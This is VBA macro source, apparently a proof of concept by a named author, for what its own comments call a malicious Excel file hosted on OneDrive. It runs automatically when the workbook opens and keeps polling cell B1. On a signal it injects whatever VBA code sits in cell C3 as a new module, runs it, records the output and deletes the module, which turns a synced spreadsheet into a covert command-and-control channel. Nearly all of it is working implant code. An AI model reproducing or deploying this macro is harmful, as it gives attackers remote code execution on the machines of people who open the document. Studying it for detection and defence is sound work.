'Author: Jake Krasnov
'Twitter: _Hubbl3
'This is the code that would be placed in the malicious XLS file and hosted 
'on Onedrive
'The document starts listening for B1 to to be set to 1 which triggers 'execution. Setting B1 to 2 causes the listener to end the routine

Sub WorkBook_Open()
   'Kick off execution
   Listen
End Sub
Public Sub Listen()
'This routine allows for a listening vba routine that
'doesn't block users from updating the file
    Dim b As Long
    Dim i As Long
    Dim a As Long
    
    'simply a loop to waste time so that updates can be pulled down
    For i = 1 To 20000
        a = i * 2
        'DoEvents is what prevents the routine from blocking
        DoEvents

    Next i
    'Check if there is a task to execute
    If Range("B1").Value = 1 Then
        Execute
        Range("B1").Value = 0
        ThisWorkbook.Save
    ElseIf Range("B1").Value = 2 Then
        Exit Sub
    End If
    
    Listen
End Sub

Sub Execute()
'This routine dynamically adds a macro module to the document, executes it and removes it

    'exposes the VBA proejct
    Set xPro = ThisWorkbook.VBProject
    Set Module = xPro.VBComponents.Add(vbext_ct_StdModule)
    'Task to execute should be placed in C3
    code = Range("C3").Value
    Module.CodeModule.AddFromString (code)
    Range("C10").Value = Application.Run("Module1.ExecuteTask")
    xPro.VBComponents.Remove xPro.VBComponents("Module1")

End Sub
